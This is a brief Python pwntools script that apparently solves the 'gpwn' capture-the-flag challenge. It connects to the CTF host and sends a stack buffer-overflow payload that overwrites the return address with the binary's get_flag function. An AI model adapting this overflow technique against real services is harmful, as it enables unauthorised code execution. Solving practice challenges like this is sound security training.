#!/usr/bin/python3

from pwn import *

p = remote("ctf.j0n9hyun.xyz", 3011)
e = ELF("./gpwn")

padding = "I"*20 + "BBBB"

payload = padding.encode('utf-8')
payload += p32(e.sym['get_flag'])

p.sendline(payload)

p.interactive()
